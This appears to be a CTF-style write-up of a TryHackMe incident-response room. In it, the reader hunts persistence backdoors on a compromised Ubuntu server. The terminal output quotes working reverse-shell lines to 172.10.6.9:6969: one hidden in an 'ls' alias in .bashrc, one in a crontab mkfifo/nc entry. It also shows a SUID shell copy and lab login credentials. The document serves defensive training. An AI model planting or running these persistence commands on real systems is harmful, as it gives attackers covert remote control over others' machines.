# Tardigrade — Writeup

## Overview
### Tardigrade — Writeup
### Tardigrade — Writeup
----
Can you find all the basic persistence mechanisms in this Linux endpoint?
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/5a8e7a7a02d75283f411004a07e7bfc6.png)
### Connect to the machine via SSH
Start Machine
A server has been compromised, and the security team has decided to isolate the machine until it's been thoroughly cleaned up. Initial checks by the Incident Response team revealed that there are five different backdoors. It's your job to find and remediate them before giving the signal to bring the server back to production.
First, let's start the Virtual Machine by pressing the Start Machine button at the top of this task. You may access the VM using the AttackBox or your VPN connection.
To start our investigation, we need to connect to the server. The IR team has provided the credentials for use below and noted that the user has root privileges to the server. I'll help guide you along at first, but as we progress through each step, I'm sure you'll feel more comfortable solving these on your own.
user: giorgio
password: armani
Answer the questions below
What is the server's OS version?

## Exploitation
```text
──(witty㉿kali)-[~/Downloads]
└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa giorgio@10.10.36.233 
The authenticity of host '10.10.36.233 (10.10.36.233)' can't be established.
ED25519 key fingerprint is SHA256:4glYNyZQWXUC3BKPPG5+org2lgDBBCdqSFt9gVuKl3Y.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.36.233' (ED25519) to the list of known hosts.
giorgio@10.10.36.233's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 01 May 2023 04:12:02 PM UTC

  System load:  0.12              Processes:             149
  Usage of /:   46.1% of 9.78GB   Users logged in:       0
  Memory usage: 6%                IPv4 address for eth0: 10.10.36.233
  Swap usage:   0%

23 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Apr 13 19:27:30 2022 from 192.168.159.128
giorgio@giorgio:~$ id
uid=1000(giorgio) gid=1000(giorgio) groups=1000(giorgio),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
giorgio@giorgio:~$ ls
giorgio@giorgio:~$ ls -lah
total 1.2M
drwxr-xr-x 4 giorgio giorgio 4.0K Apr 13  2022 .
drwxr-xr-x 3 root    root    4.0K Apr 13  2022 ..
-rwsr-xr-x 1 root    root    1.2M Apr 13  2022 .bad_bash
-rw------- 1 giorgio giorgio    0 May  1 16:12 .bash_history
-rw-r--r-- 1 giorgio giorgio  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 giorgio giorgio 3.9K Apr 13  2022 .bashrc
drwx------ 2 giorgio giorgio 4.0K Apr 13  2022 .cache
-rw-r--r-- 1 giorgio giorgio  807 Feb 25  2020 .profile
-rw-rw-r-- 1 giorgio giorgio   75 Apr 13  2022 .selected_editor
drwx------ 2 giorgio giorgio 4.0K Apr 13  2022 .ssh
-rw-r--r-- 1 giorgio giorgio    0 Apr 13  2022 .sudo_as_admin_successful
-rw------- 1 giorgio giorgio 9.9K Apr 13  2022 .viminfo

giorgio@giorgio:/etc$ cat /etc/issue
Ubuntu 20.04.4 LTS 

giorgio@giorgio:~$ cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.4 LTS"
```
*Ubuntu 20.04.4 LTS*
### Investigating the giorgio account
Since we're in the giorgio account already, we might as well have a look around.
Answer the questions below
```text
giorgio@giorgio:~$ ls -lah
total 1.2M
drwxr-xr-x 4 giorgio giorgio 4.0K Apr 13  2022 .
drwxr-xr-x 3 root    root    4.0K Apr 13  2022 ..
-rwsr-xr-x 1 root    root    1.2M Apr 13  2022 .bad_bash
-rw------- 1 giorgio giorgio    0 May  1 16:12 .bash_history
-rw-r--r-- 1 giorgio giorgio  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 giorgio giorgio 3.9K Apr 13  2022 .bashrc
drwx------ 2 giorgio giorgio 4.0K Apr 13  2022 .cache
-rw-r--r-- 1 giorgio giorgio  807 Feb 25  2020 .profile
-rw-rw-r-- 1 giorgio giorgio   75 Apr 13  2022 .selected_editor
drwx------ 2 giorgio giorgio 4.0K Apr 13  2022 .ssh
-rw-r--r-- 1 giorgio giorgio    0 Apr 13  2022 .sudo_as_admin_successful
-rw------- 1 giorgio giorgio 9.9K Apr 13  2022 .viminfo

giorgio@giorgio:~$ tac .bashrc
cat /dev/null > ~/.bash_history

fi
  fi
    . /etc/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  if [ -f /usr/share/bash-completion/bash_completion ]; then
if ! shopt -oq posix; then
```
```text
# sources /etc/bash.bashrc).
```
```text
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
```
```text
# enable programmable completion features (you don't need to enable

fi
    . ~/.bash_aliases
if [ -f ~/.bash_aliases ]; then
```
```text
# See /usr/share/doc/bash-doc/examples in the bash-doc package.
```
```text
# ~/.bash_aliases, instead of adding them here directly.
```
```text
# You may want to put all your additions into a separate file like
```
```text
# Alias definitions.

alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
```
```text
#   sleep 10; alert
```
```text
# Add an "alert" alias for long running commands.  Use like so:

alias ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -alF'
```
```text
# some more ls aliases

giorgio@giorgio:~$ crontab -e
* * * * * /usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc 172.10.6.9 6969 >/tmp/f
```
What's the most interesting file you found in giorgio's home directory?
Using the ls command on giorgio's home directory doesn't seem to return anything, so maybe we can find something interesting in the hidden files?
*.bad_bash*
In every investigation, it's important to keep a dirty wordlist to keep track of all your findings, no matter how small. It's also a way to prevent going back in circles and starting from scratch again. As such, now's a good time to create one and put the previous answer as an entry so we can go back to it later.
Another file that can be found in every user's home directory is the .bashrc file. Can you check if you can find something interesting in giorgio's .bashrc?
alias is a command that allows a string to be interpreted using a shorter, usually easier-to-remember "alias" for the string. Maybe there's a suspicious usage of alias somewhere?
*'(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --co lor=auto'*
It seems we've covered the usual bases in giorgio's home directory, so it's time to check the scheduled tasks that he owns.
Did you find anything interesting about scheduled tasks?
cron is a great way to automate recurring tasks. Maybe there's a suspicious usage of cron?
*/usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc 172.10.6.9 6969 >/tmp/f*
### Dirty Wordlist Revisited
In the previous task, the concept of a dirty wordlist was introduced. In this task, we will discuss it in more detail.
A dirty wordlist is essentially raw documentation of the investigation from the investigator's perspective. It may contain everything that would help lead the investigation forward, from actual IOCs to random notes. Keeping a dirty wordlist assures the investigator that a specific IOC has already been recorded, helping keep the investigation on track and preventing getting stuck in a closed loop of used leads.
It also helps the investigator remember the mindset that they had during the course of the investigation. The importance of taking note of one's mindset during different points of an investigation is usually given less importance in favour of focusing on the more exciting atomic indicators; however, recording it provides further context on why a specific bit is recorded in the first place. This is how pivot points are decided and further leads, born and pursued.
Answer the questions below
This section is a bonus discussion on the importance of a dirty wordlist. Accept the extra point and happy hunting!
What is the flag?
